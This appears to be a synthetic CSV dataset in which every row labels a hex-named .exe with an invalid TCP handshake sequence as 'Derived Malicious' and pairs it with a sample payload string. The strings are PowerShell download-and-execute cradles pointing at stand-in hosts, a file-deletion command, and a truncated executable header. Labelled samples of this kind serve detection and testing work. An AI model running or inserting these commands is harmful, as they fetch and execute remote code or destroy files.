trace_id,sequence,valid,description,category,content
0d3465f8f227108f.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
4e194eb7d4d431f2.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
2052c0368adb8101.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
2c9ff67f89283e4c.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
97b6af73b20c5b49.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
6ef1b266dcfee37e.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
b4a13d579c367f64.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
304c7f8c6863bf44.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
3db1065c09e317c8.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
0c0eba751e018dae.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
7f270bf002e459e8.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
4a68419c5a08e61a.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
f0d590a6e2b715b7.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
1183f1f5d6bf413a.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
b76cf3ae2201a62c.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
b0def7738227cc7d.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
1e3f11177e3a8ad1.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
a77d6569571dea23.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
acdb4f40ed32c719.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
099d655f10b7e9d0.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
9380f9cd5f729427.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
ccd9b10fea5f1a9b.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
1315727eb211a211.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
79a46789e71cdf11.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
dc7ade8fcae56fa5.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
2f6521a0518df10d.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
2bb2831b682e6824.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
eb6bbcf1755a8438.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
b397f6734c037272.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
bb0d9d8cf3e5d3fb.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
c4b7da28a9918d63.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
3e222a87ae7cd1bb.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
706bd5b40284565f.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
74162fa1b634bfdd.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
8e53df513c97e088.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
8d837044cfe6ddef.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
7cdd49950b4a23a7.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
04cee7500d85f9bf.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
412657da0b46d9ae.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
2604650b41bbef92.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
419f2789e530e519.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
5f9da8134eece8b2.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
b262dbb7c5bfedc3.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
2231867f5f922d40.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
4cac81becc4a1a71.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
ec85297c2929326d.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
6880d2e79190370d.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
ef733109702604aa.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
1edb5c54fee229f7.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
3535ec01e3c3d8fc.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
4951e5ffbbf2e9fc.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
beafc1267a685891.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
e47782d222656eec.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
1b7a05712f28b561.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5c8b1254a5bd8b05.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
730d3ee3b2f855ab.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
d0dcbde5aede4521.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
eccb065e1c60436d.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
7cb86a806eee992f.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5bf8bb40d3b7c932.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
158e0b858fae94ed.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
95a565fbe3dd5878.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
4851d648ac7b8d3c.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
952d257f78978916.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
9d78d1a07b45a185.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
06c48259a665bbb3.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
d9e871e6768a9e56.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
af77b6d2c8b4ac5d.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
8951edf18c219c38.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
03a70859a1f4dcac.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
0a171e762c612998.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
b39dbc57e68cf701.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
25ba037bd4fbaad7.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
39f443a944e3114c.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
6c88715b14506c09.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
c04692ca49de6371.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
e98ca40cb2b9f9df.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
c06c5f5aa047340e.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
f0349351ccde85a4.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
7053a78a22699887.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
f68bb42ce6d65902.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
8a4d95a53d4c0874.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
db18e8e273721a43.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
f60cbbaa58e65a6f.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
5e2776b0be25cad0.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
859a52cd1b0aa5c8.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
41b26a08cef23f1d.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
02584dda37c39942.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
cdfa1a1c4f07c6d2.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
3994471e828d2d7e.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
552d14f8fa862c32.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
75698eb6a16c7821.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
298d9879445508c4.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
905e6497a4311a55.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
a44bec73fa5d84c9.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
90c9239491c061d7.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
8c88e1e8081c3c17.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
3efa7fdc4ca6834b.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
11457a99a5505f70.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
6f04f539195c8997.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
0971fabef1b2be77.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
6866598b56e0e765.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
3519fe69cbcf1629.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
4f8401fdd571a783.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
1ed59a443752b052.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
e13d662598bb11ad.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
692823887bbac35e.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
a1bb6e84b0b189af.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
814aedf8fadc6714.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
c0bf1c478e8d53b1.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
c8fcc2de3b0ed395.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
8cf1ea10fd9308e0.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
d801da6fdceb7c55.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
82c25613755c7a3a.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
1566f358c08b6120.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
dd30e84956943977.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
29d8e169a30fd789.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
bf2d4bd210b6d0e0.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
d8b148e7c3976a63.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
622897d442c8d19d.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
72e8e736fa3a5943.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
d9cfedd1e1c2ceaf.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
f28257175a229bff.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
1fa982bca8d93cd9.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
cad79c9a2cfbb427.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
489e84c61f0e1903.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
2b518cfe6a22ca71.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
180477b92b3bf7d6.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
5fe93eb8a1c1b6c8.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
885857c7fc9c8633.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
a03ff18b9f7a2cee.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
3fa7f08147bbe9ca.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
4361123c342a2143.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
6d1993a525231ac0.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
ec4f449e19e854e4.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
c9570917c32ecb1c.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
dcdf9338be399d3f.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
195a50cab4bfb5ff.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
920c6c5caca9705a.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
0a7e2e56ddf65415.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
e42c9b044f2c6cda.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
c247ddf966fd2c2d.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
445a016e7a9eddbc.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
954e699ce4c89e0d.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
2486ff293e8a4ed2.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
1f9d65ae17cb1589.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
01aecb9a700bcbe3.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
d5f834ae593cabd4.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
f25fdd8cbe59d14d.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
fc6514ef333a9a7d.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
34146c45e0a3f59a.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
58fc6df98de88f68.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
f5760a0faea9103e.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
3d26f33eb0271723.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
d21e337aaf448ac1.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
206f172271cfbfde.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
7183f98072abf96c.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
00403751b3d57bb7.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
45cc417aeb30d7aa.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5edfab8bc3e2477d.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
82d63bc762e28c49.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
bbb7f497a39ba38e.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
b3e79810719b8444.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
b2d036dd47e8eed6.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
8a353949d368ecad.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
f3dee0219902b283.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
7eb7412cb7541b33.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
e7ed07eae8640c7a.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
92004fdfd845395f.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
b08ba532b43fe11e.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
bc3aa47a1952772e.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
259118aba0c3a206.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
b75def84d6907e45.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
